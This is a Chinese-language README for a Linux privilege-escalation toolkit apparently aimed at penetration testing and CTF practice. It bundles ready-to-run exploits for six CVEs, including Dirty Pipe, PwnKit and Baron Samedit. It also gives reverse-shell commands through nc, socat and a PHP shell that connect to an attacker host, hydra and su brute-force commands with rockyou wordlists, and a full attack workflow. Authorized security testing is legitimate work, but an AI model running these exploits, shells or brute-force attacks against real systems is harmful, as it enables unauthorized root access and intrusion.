# ll-privesc-kit

> **仅供授权渗透测试 / 安全研究 / CTF 竞赛使用。未经授权对任何系统使用本工具集属于违法行为，作者不承担任何责任。**

Linux 打靶常用工具整合套件，包含经典内核/SUID 提权漏洞 PoC、进程监控工具、密码字典、反弹 Shell 模板及辅助脚本，覆盖从信息收集到权限提升的完整攻击链。

---

## 目录

- [快速概览](#快速概览)
- [目录结构](#目录结构)
- [提权漏洞 PoC](#提权漏洞-poc)
  - [01copyfail — CVE-2026-31431 Copy Fail](#01copyfail--cve-2026-31431-copy-fail)
  - [02dirtypipe — CVE-2022-0847 Dirty Pipe](#02dirtypipe--cve-2022-0847-dirty-pipe)
  - [03pwnkit — CVE-2021-4034 PwnKit](#03pwnkit--cve-2021-4034-pwnkit)
  - [04chwoot — CVE-2025-32463 sudo chwoot](#04chwoot--cve-2025-32463-sudo-chwoot)
  - [05pack2theroot — CVE-2026-41651 PackageKit TOCTOU](#05pack2theroot--cve-2026-41651-packagekit-toctou)
  - [06sudo3165 — CVE-2021-3156 Baron Samedit](#06sudo3165--cve-2021-3156-baron-samedit)
- [信息收集工具](#信息收集工具)
  - [linpeas.sh](#linpeassh)
  - [lin2026.sh](#lin2026sh)
  - [pspy — 进程监控](#pspy--进程监控)
  - [busybox](#busybox)
  - [socat](#socat)
- [密码字典](#密码字典)
  - [rockyou 系列字典](#rockyou-系列字典)
  - [基于用户名的字典生成](#基于用户名的字典生成)
- [反弹Shell](#反弹Shell)
  - [reverse.php — PHP 反弹 Shell](#reversephp--php-反弹-shell)
  - [subrute.sh — 本地 su 爆破](#subrute.sh--本地-su-爆破)
- [典型工作流](#典型工作流)
- [免责声明](#免责声明)

---

## 快速概览

| 类别 | 工具 / 文件 | 关联 CVE / 功能 |
|------|-------------|-----------------|
| 提权 PoC | `01copyfail/` | CVE-2026-31431 内核页缓存写原语 |
| 提权 PoC | `02dirtypipe/root` | CVE-2022-0847 Dirty Pipe 预编译 ELF |
| 提权 PoC | `03pwnkit/` | CVE-2021-4034 polkit pkexec |
| 提权 PoC | `04chwoot/` | CVE-2025-32463 sudo `-R` 路径穿越 |
| 提权 PoC | `05pack2theroot/` | CVE-2026-41651 PackageKit D-Bus TOCTOU |
| 提权 PoC | `06sudo3165/` | CVE-2021-3156 sudo 堆溢出 Baron Samedit |
| 信息收集 | `linpeas.sh` / `lin2026.sh` | Linux 本地枚举脚本 |
| 进程监控 | `pspy32/64/64s` | 无需 root 的进程监控 |
| 辅助工具 | `busybox` / `socat` | 静态 BusyBox、端口转发 / Shell |
| 反弹 Shell | `reverse.php` | PHP 反弹 Shell 模板 |
| 字典 | `5000.txt` ~ `100000.txt` | rockyou 前 5k/10k/20k/100k |
| 字典生成 | `generate_by_username.sh` + `muban.key` | 按用户名扩展的密码字典 |
| su 爆破 | `subrute.sh` | 基于字典的本地 su 密码爆破 |

---

## 目录结构

```
ll-privesc-kit/
├── 01copyfail/                # CVE-2026-31431 Copy Fail (C port)
│   ├── copy-fail-c/           #   源码：exploit.c, exploit-passwd.c, vulnerable.c
│   └── copyfail               #   预编译 ELF（x86_64）
├── 02dirtypipe/
│   └── root                   # CVE-2022-0847 Dirty Pipe 预编译 ELF
├── 03pwnkit/
│   └── CVE-2021-4034/         # polkit pkexec 提权源码 + Makefile
├── 04chwoot/
│   ├── CVE-2025-32463_chwoot/ #   exp.sh + 预编译 woot1337.so.2
│   ├── chwoot/                #   备用二进制
│   └── chwoot.sh              #   一键运行脚本
├── 05pack2theroot/
│   └── cve_2026_41651.py      # PackageKit TOCTOU Python3 PoC
├── 06sudo3165/
│   └── CVE-2021-3156/         # Baron Samedit 多版本 Python/C exploit
├── 5000.txt                   # rockyou 前 5,000 条
├── 10000.txt                  # rockyou 前 10,000 条
├── 20000.txt                  # rockyou 前 20,000 条
├── 100000.txt                 # rockyou 前 100,000 条
├── muban.key                  # 用户名变体密码模板
├── generate_by_username.sh    # 按用户名渲染 muban.key
├── subrute.sh                 # 本地 su 密码爆破脚本
├── reverse.php                # PHP 反弹 Shell 模板
├── reverse.txt                # 反弹 Shell 速查备忘
├── linpeas.sh                 # 轻量 Linux 枚举脚本
├── lin2026.sh                 # LinPEAS 本地枚举（最新版）
├── pspy32                     # pspy 32位静态 ELF
├── pspy64                     # pspy 64位静态 ELF
├── pspy64s                    # pspy 64位精简静态 ELF
├── busybox                    # 静态编译 BusyBox（多命令集合）
└── socat                      # 静态编译 socat（端口转发 / Shell）
```

---

## 提权漏洞 PoC

### 01copyfail — CVE-2026-31431 Copy Fail

**漏洞概述**  
内核 AF_ALG AEAD 接口中，`algif_aead` 将 splice 进来的源页面同时作为"密文输入"和"明文输出"（in-place 优化）。认证验证失败前，解密操作已将 payload 写入页缓存。攻击者可利用此原语将任意字节写入**只读打开**的 setuid 二进制的内存页，待进程 execve 该二进制时内核以 setuid root 凭据执行 payload。

**影响内核范围**：`v4.14`（2017-08）~ `mainline a664bf3d603d`（2026-04，修复提交）  
Ubuntu / RHEL / Debian / SUSE 均在披露时（2026-04-29）确认受影响。

**文件说明**

| 文件 | 说明 |
|------|------|
| `copy-fail-c/exploit.c` | 二进制变种：替换目标 setuid 二进制页缓存后 execve |
| `copy-fail-c/exploit-passwd.c` | /etc/passwd UID-flip 变种：将当前用户 UID 字段改为 0000 |
| `copy-fail-c/vulnerable.c` | 无破坏性漏洞检测器（退出码 100=存在漏洞） |
| `copy-fail-c/payload.c` | 植入 payload：`setgid(0); setuid(0); execve(/bin/sh)` |
| `copyfail` | 预编译 x86_64 ELF，可直接上传到靶机运行 |

**使用**

```bash
# 编译（需要 gcc + binutils + linux-libc-dev）
cd 01copyfail/copy-fail-c
make

# 漏洞检测（无副作用）
./vulnerable       # 退出码 100 → 受影响

# 提权（二进制变种，替换 /usr/bin/passwd 或其他 setuid binary）
./exploit

# 已预编译版本直接使用
./copyfail
```

---

### 02dirtypipe — CVE-2022-0847 Dirty Pipe

**漏洞概述**  
Linux 内核 5.8+ pipe 实现中，`PIPE_BUF_FLAG_CAN_MERGE` 标志未被正确初始化，允许无特权用户向任意只读文件映射的页缓存写入数据，进而覆盖 setuid 二进制或 `/etc/passwd`，实现本地提权。

**影响内核**：5.8 ~ 5.16.11 / 5.15.25 / 5.10.102

**文件说明**

| 文件 | 说明 |
|------|------|
| `02dirtypipe/root` | 预编译 x86_64 ELF，直接执行即可尝试获取 root shell |

**使用**

```bash
# 上传到靶机后赋权执行
chmod +x 02dirtypipe/root
./02dirtypipe/root
```

---

### 03pwnkit — CVE-2021-4034 PwnKit

**漏洞概述**  
Polkit `pkexec` 在处理命令行参数时存在越界写漏洞（内存破坏），所有主流 Linux 发行版上默认安装的 `pkexec`（SUID root）均受影响，可本地无条件提权到 root。自 2009 年 polkit 首次发布起即存在，影响长达 12 年。

**影响范围**：主要影响 pkexec 版本为 0.105 之前的系统，包括 Ubuntu、CentOS、Debian 等众多 Linux 发行版。 

**文件说明**

| 文件 | 说明 |
|------|------|
| `cve-2021-4034.c` | 主 exploit dropper |
| `pwnkit.c` | 恶意共享库（被 pkexec 加载以提权）|
| `Makefile` | 一键编译 |
| `cve-2021-4034.sh` | One-liner 脚本，下载并自动编译执行 |
| `dry-run/` | 仅检测漏洞是否存在，不执行 shell |

**使用**

```bash
cd 03pwnkit/CVE-2021-4034
make
./cve-2021-4034
# whoami → root

# 仅检测（不执行 shell）
make dry-run
./dry-run/dry-run-cve-2021-4034
# 输出 "root" 则存在漏洞
```

---

### 04chwoot — CVE-2025-32463 sudo chwoot

**漏洞概述**  
sudo 的 `-R`（`--chroot`）选项存在路径穿越，低权限用户可通过构造特定参数绕过沙盒限制实现提权。脚本兼容有/无 gcc 两种环境（无 gcc 时使用预编译 `woot1337.so.2`）。

**影响范围**：Sudo 1.9.14 至 1.9.17 

**漏洞验证**

```bash
sudo -R woot woot
# 若输出 "sudo: woot: No such file or directory" → 存在漏洞
# 若输出 "sudo: you are not permitted to use the -R option" → 已修复
```

**使用**

```bash
cd 04chwoot/CVE-2025-32463_chwoot
chmod +x exp.sh
./exp.sh
# 或使用一键脚本
bash chwoot.sh
```
---

### 05pack2theroot — CVE-2026-41651 PackageKit TOCTOU

**漏洞概述**  
PackageKit D-Bus 事务处理中存在 TOCTOU 竞争：攻击者对同一事务对象先调用 `InstallFiles(FLAG_SIMULATE)` 触发 polkit 授权，随即调用 `InstallFiles(FLAG_NONE)` 替换安装包。认证通过时实际执行的是包含恶意 postinst 脚本的 payload 包，以 root 权限创建 SUID bash。

**影响版本**：PackageKit < 1.3.5  

**文件说明**

| 文件 | 说明 |
|------|------|
| `cve_2026_41651.py` | Python3 PoC，自动检测 deb/rpm 环境，构建并竞争安装 |

**使用**

```bash
# 前置：需要 python3-gi（GObject Introspection）
apt install python3-gi    # Debian/Ubuntu
dnf install python3-gobject  # RHEL/Fedora

cd 05pack2theroot
python3 cve_2026_41651.py
# 成功后 /tmp/.suid_bash 变为 SUID root
/tmp/.suid_bash -p
# whoami → root
```

---

### 06sudo3165 — CVE-2021-3156 Baron Samedit

**漏洞概述**  
sudo 在解析命令行时，对 `\` 转义字符处理不当导致**堆缓冲区溢出**，无需 sudo 权限的本地用户即可利用漏洞提权到 root。该漏洞存在约 10 年。

**影响范围**：sudo 1.8.2 ~ 1.8.31p2 及 1.9.0 ~ 1.9.5p1

**文件说明（glibc 含 tcache，如 Ubuntu ≥ 17.10、CentOS 8、Debian 10）**

| 文件 | 说明 |
|------|------|
| `exploit_nss.py` | 自动检测配置，推荐首选 |
| `exploit_nss_manual.py` | 简化版，便于理解原理 |
| `exploit_timestamp_race.c` | 竞争修改 /etc/passwd 的 C 实现 |

**文件说明（glibc 无 tcache，如 Debian 9、Ubuntu 14/16）**

| 文件 | 说明 |
|------|------|
| `exploit_nss_d9.py` | 针对 Debian 9 默认配置 |
| `exploit_nss_u16.py` | 针对 Ubuntu 16.04 |
| `exploit_nss_u14.py` | 针对 Ubuntu 14.04 |
| `exploit_defaults_mailer.py` | 覆写 mailer 路径（CentOS 6/7 无 `--disable-root-mailer` 编译） |
| `exploit_userspec.py` | 覆写 userspec 跳过认证（sudo 1.8.9~1.8.23）|
| `exploit_cent7_userspec.py` | CentOS 7 简化版 |

**使用**

```bash
cd 06sudo3165/CVE-2021-3156

# Ubuntu ≥ 17.10 / CentOS 8 / Debian 10（首选）
python3 exploit_nss.py

# Debian 9 默认配置
python3 exploit_nss_d9.py

# Ubuntu 16.04
python3 exploit_nss_u16.py

# CentOS 6/7（无 tcache）
python3 exploit_defaults_mailer.py
```

---

## 信息收集工具

### lin2026.sh

[LinPEAS](https://github.com/carlospolop/PEASS-ng) — Linux 本地权限提升枚举脚本，自动检查数百项安全配置项，包括：

- SUID/SGID 文件
- 可写的 cron / systemd unit
- 容器逃逸标志（Docker / LXC）
- 内核版本与已知 CVE 匹配
- 密码文件、SSH 密钥、历史记录

```bash
# 上传后赋权运行（靶机无需联网）
chmod +x lin2026.sh
./lin2026.sh 2>/dev/null | tee /tmp/lp.txt

# 直接回显到 kali（在 kali 上监听）
nc -lvnp 9001
# 靶机执行：
./lin2026.sh | nc <KALI_IP> 9001
```

### linpeas.sh

轻量版

```bash
chmod +x linpeas.sh
./linpeas.sh
```

### pspy — 进程监控

[pspy](https://github.com/DominicBreuker/pspy) 无需 root 权限即可实时监控所有进程的创建与命令行，常用于发现定时任务中的密码或可劫持的脚本路径。

| 二进制 | 说明 |
|--------|------|
| `pspy64` | 64 位系统（推荐）|
| `pspy32` | 32 位系统 |
| `pspy64s` | 64 位精简版（文件更小）|

```bash
chmod +x pspy64
./pspy64          # 实时监控，Ctrl+C 退出
./pspy64 -i 1000  # 每 1000ms 轮询一次
```

### busybox

静态编译的 BusyBox，在目标系统缺少基础命令（`wget`、`nc`、`awk` 等）时作为替代。

```bash
chmod +x busybox
./busybox sh               # 获取 shell
./busybox wget http://IP/FILE -O /tmp/file
./busybox nc -e /bin/sh <IP> <PORT>
```

### socat

静态编译的 `socat`，功能远强于 `nc`，支持全双工、加密、端口转发。

```bash
chmod +x socat

# 正向 shell（靶机监听）
./socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# 反弹 shell（靶机执行，kali 监听）
# kali: socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
./socat TCP:<KALI_IP>:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# 端口转发
./socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
```

---

## 密码字典

### rockyou 系列字典

按需选择规模，字典条目均来自 rockyou.txt 原始排序前n条。

| 文件 | 条数 | 适用场景 |
|------|------|----------|
| `5000.txt` | ~5,000 | 快速验证 / 高频密码 |
| `10000.txt` | ~10,000 | 常规 CTF / Web 登录 |
| `20000.txt` | ~20,000 | 均衡速度与覆盖率 |
| `100000.txt` | ~100,000 | 深度爆破 / SSH / SMB |

**配合 hydra 示例**

```bash
hydra -l admin -P 20000.txt ssh://192.168.1.100
hydra -l admin -P 10000.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

**配合 subrute.sh 本地 su 爆破**

```bash
bash subrute.sh root 10000.txt
```

### 基于用户名的字典生成

当已知目标用户名时，`muban.key` 包含数百条基于 `%user%` 占位符的常见密码变体模式（`用户名+年份`、`用户名+特殊字符`、`用户名@数字` 等）。

```bash
# 为用户 john 生成专属字典
bash generate_by_username.sh john > john_passwords.txt

# 生成后配合 hydra 或 subrute.sh 使用
bash subrute.sh john john_passwords.txt
hydra -l john -P john_passwords.txt ssh://TARGET
```

---

## 反弹Shell

### reverse.php — PHP 反弹 Shell

pentestmonkey 经典 PHP 反弹 Shell，适用于已获得 PHP 文件上传或写入能力的场景。

**修改后使用**

```bash
# 1. 修改 IP 和端口（必须）
vim reverse.php
# $ip = 'YOUR_KALI_IP';
# $port = 4444;

# 2. kali 开启监听
nc -lvnp 4444

# 3. 触发（上传到 Web 目录后访问）
curl http://TARGET/reverse.php
```

### subrute.sh — 本地 su 爆破

在已有低权限 shell 时，利用字典对 `su` 命令进行本地密码爆破，

项目地址: https://github.com/yanxinwu946/suBrute

```bash
# 用法：bash subrute.sh <用户名> <字典文件>
bash subrute.sh root 5000.txt
bash subrute.sh admin 20000.txt

# 使用用户名专属字典
bash generate_by_username.sh targetuser > /tmp/custom.txt
bash subrute.sh targetuser /tmp/custom.txt
```

---

## 典型工作流

```
获得低权限 Shell
       │
       ├─ 信息收集
       │   ├── ./linpeas.sh          # 全面枚举
       │   ├── ./pspy64              # 监控定时任务 / 高权限进程
       │   └── uname -r              # 确认内核版本
       │
       ├─ 内核/组件漏洞利用（按内核版本选择）
       │   ├── CVE-2026-31431  → 01copyfail/copyfail（内核 4.14~2026-04）
       │   ├── CVE-2022-0847   → 02dirtypipe/root（内核 5.8~5.16.11）
       │   ├── CVE-2021-4034   → 03pwnkit/（polkit 已安装）
       │   ├── CVE-2025-32463  → 04chwoot/chwoot.sh（sudo -R 存在）
       │   ├── CVE-2026-41651  → 05pack2theroot/cve_2026_41651.py（PackageKit < 1.3.5）
       │   └── CVE-2021-3156   → 06sudo3165/（sudo 1.8.2~1.8.31p2）
       │
       ├─ 密码爆破（已知用户名）
       │   ├── bash generate_by_username.sh <user> > custom.txt
       │   └── bash subrute.sh <user> custom.txt
       │       或 hydra -l <user> -P 20000.txt ssh://TARGET
       │
       └─ 后渗透 / 横向
           ├── socat 端口转发 / 稳定 Shell
           ├── busybox 补充缺失命令
           └── reverse.php Web Shell 反弹
```

---

## 免责声明

**严禁**将本工具集或其中任何组件用于未授权访问、破坏、数据窃取或任何违反当地法律法规的行为。作者对任何滥用行为不承担法律责任。

各 PoC 原始作者版权归原作者所有，详见各子目录 README 及 LICENSE 文件。

---

*Maintained by [yanxinwu946](https://github.com/yanxinwu946) @ [MazeSec](https://maze-sec.com)*
